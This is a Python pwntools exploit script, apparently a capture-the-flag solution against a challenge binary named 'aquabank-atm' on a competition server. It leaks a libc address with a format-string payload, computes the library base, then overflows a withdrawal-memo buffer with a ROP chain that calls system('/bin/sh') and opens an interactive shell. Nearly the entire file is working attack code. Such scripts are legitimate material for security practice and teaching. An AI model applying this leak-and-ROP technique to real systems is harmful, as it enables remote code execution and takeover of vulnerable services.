#!/usr/bin/env python3

from pwn import *


exe = ELF("./aquabank-atm")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("offsec.m0lecon.it", 13523)

    return r


def main():
    p = conn()
    OFF = 128  # On withdrawal
    p.recvuntil(b"> ")
    p.sendline(b"1")
    # payload = b"%114$p" (local offset)
    # payload = b"%74$p"  # (remote offset)
    # payload = b"%112$p"
    # payload = b"%33$p"
    payload = b"%33$p"
    p.sendline(payload)
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.recvuntil(b"--- Your customer note ---\n")
    addr = int(p.recvline().strip(), 16)
    # libc.address = addr & ~0xFFFFF
    libc.address = addr - libc.symbols["__libc_start_main"] - 0x8B
    # libc.address = addr & ~0xFFF
    print(f"Address: {hex(libc.address)}")
    BINSH = next(libc.search(b"/bin/sh\x00"))
    # Stage 2 write the binsh string at a fixed address (note array)
    # binsh = b"/bin/sh"
    # p.recvuntil(b"> ")
    # p.sendline(b"1")
    # p.sendline(binsh)
    print(p.recvuntil(b"> "))

    # Stage 3 Buffer overflow and system call
    p.sendline(b"3")
    print(p.recvuntil(b"From account: "))
    p.sendline(b"A")
    print(p.recvuntil(b"Amount: "))
    p.sendline(b"10")
    print(p.recvuntil(b"Withdrawal memo (be brief):\n"))
    ret = 0x000000000040101A
    ret_libc = 0x000000000002882F
    pop_rdi = 0x000000000010F78B
    pop_rsi = 0x0000000000110A7D
    syscall = 0x00000000000288B5
    pop_rax = 0x00000000000DD237
    payload = flat(
        b"A" * (OFF),
        p64(ret),
        # p64(ret_libc),
        p64(libc.address + pop_rdi),
        # p64(exe.symbols["note"]),
        p64(BINSH),
        # p64(ret_libc),
        # p64(exe.symbols["main"]),
        # p64(libc.symbols["puts"]),
        p64(ret),
        p64(libc.symbols["system"]),
        # p64(exe.symbols["main"]),
        # p64(libc.symbols["system"]),
    )
    # p.interactive()
    p.send(payload + b"\n")
    # p.interactive()
    # %114$p
    # %130$p

    # good luck pwning :)

    p.interactive()


if __name__ == "__main__":
    main()
